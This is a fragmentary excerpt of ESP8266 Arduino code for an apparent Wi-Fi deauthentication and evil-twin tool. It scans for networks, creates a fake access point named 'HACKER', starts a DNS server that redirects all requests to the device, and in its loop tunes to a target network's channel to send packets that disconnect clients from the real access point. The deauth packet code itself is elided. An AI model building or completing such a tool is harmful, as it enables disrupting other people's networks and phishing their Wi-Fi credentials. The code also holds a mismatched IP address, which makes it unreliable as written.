...
typedef struct
{
  ...
  uint8_t ch;
  uint8_t bssid[6];
}  _Network;                 // information about detected Wi-Fi networks


const byte DNS_PORT = 53;
IPAddress apIP(192, 128, 1, 1);
DNSServer dnsServer;
...
void setup() {
  ...
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);               // Access Point + Web Interface (  Both AP and Station mode  ) 
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  WiFi.softAP("HACKER", "Hacker1802");         // Fake AP name and password
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));          // // Redirect all requests to local IP
...
void performScan() {
  int n = WiFi.scanNetworks();               //  Scanning Wi-Fi
  clearArray();
  if (n >= 0) {
...
void loop() {
  ...
  if (deauthing_active && millis() - deauth_now >= 1000) {
    ...
    wifi_set_channel(_selectedNetwork.ch);                    // Set to target's channel
    ...
    // This packet is sent to disconnect clients from the real Access Point
